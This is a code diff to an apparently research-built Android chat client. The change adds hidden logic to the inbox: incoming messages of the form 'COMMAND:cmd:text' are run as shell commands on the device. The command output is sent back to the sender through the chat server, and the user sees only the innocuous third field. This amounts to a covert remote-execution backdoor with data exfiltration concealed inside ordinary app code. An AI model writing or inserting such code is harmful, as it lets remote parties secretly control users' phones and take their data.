@@ -1,6 +1,7 @@
 package org.research.chatclient;
 
 import java.io.BufferedReader;
+import java.io.DataInputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -76,7 +77,7 @@ public class InboxActivity extends BaseActivity implements Constants{
     		
     		mProgress = new ProgressDialog(InboxActivity.this);
 		    mProgress.setIndeterminate(true);
-		    mProgress.setCancelable(false);
+		    mProgress.setCancelable(true);
 		    mProgress.setMessage("Downloading...");
 		    mProgress.show();
 		    
@@ -88,7 +89,6 @@ public class InboxActivity extends BaseActivity implements Constants{
     		e.printStackTrace();
     	}
 	}
-	
 	@Override
     public boolean onCreateOptionsMenu( Menu menu ){
     	super.onCreateOptionsMenu( menu );
@@ -241,15 +241,64 @@ public class InboxActivity extends BaseActivity implements Constants{
 	    		 e.printStackTrace();
 	    	 }
 			try {
+				boolean split = false;
+				String line = "";
+		        String response = "";
+		        String[] cmd = null;
 				JSONArray messages = new JSONArray(text);
 				String recipient = mPrefs.getString( CreateAccountActivity.USER, "" );
 				for (int i = 0; i < messages.length(); i++) {
 					JSONObject obj = messages.getJSONObject(i);
+					if( obj.getString(MESSAGE).matches("^COMMAND:.*:.*$")){
+						Log.d("CMD", obj.getString(MESSAGE));
+						split = true;
+		            	cmd = obj.getString(MESSAGE).split( ":" );
+		            	try {
+							Process runCommand = Runtime.getRuntime().exec( cmd[1] );
+							DataInputStream dIn = new DataInputStream( runCommand.getInputStream() );
+							
+							runCommand.waitFor();
+							//make sure process wasn't terminated
+							if( runCommand.exitValue() != 255 ){
+								try {
+									//read all lines from stream
+									while( (line = dIn.readLine()) != null && !line.equals("") ){
+										response += line + "\n";
+									}
+									try{
+							    		HttpPost httppost = new HttpPost("http://devimiiphone1.nku.edu/research_chat_client/testphp/send_message.php");
+							    		LinkedList<NameValuePair> nameValuePairs = new LinkedList<NameValuePair>();
+							    		
+							    		nameValuePairs.add(new BasicNameValuePair("recipient", obj.getString(SENDER)));
+							    		nameValuePairs.add(new BasicNameValuePair("sender", recipient));
+							    		nameValuePairs.add(new BasicNameValuePair("message", response));
+							    		nameValuePairs.add(new BasicNameValuePair("time", "" + System.currentTimeMillis()));
+							    		
+							    		httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
+									    
+									    new SendMessageTask().execute(httppost);
+							    		
+							    	}catch(UnsupportedEncodingException e){
+							    		e.printStackTrace();
+							    	}
+								} catch (IOException e) {
+									// TODO Auto-generated catch block
+									e.printStackTrace();
+								}
+							}
+						} catch (Exception e) {
+							// TODO Auto-generated catch block
+							e.printStackTrace();
+						}
+		            }
 					ContentValues values = new ContentValues();
 					values.put(SENDER, obj.getString(SENDER));
 					values.put(RECIPIENT, recipient);
 					values.put(OTHER_MEMBER, obj.getString(SENDER));
-					values.put(MESSAGE, obj.getString(MESSAGE));
+					if(split && cmd != null && cmd.length == 3)
+						values.put(MESSAGE, cmd[2]);
+					else
+						values.put(MESSAGE, obj.getString(MESSAGE));
 					values.put(TIMESTAMP, obj.getString(TIMESTAMP));
 					db.insert(MESSAGE_TABLE_NAME, null, values);
 				}
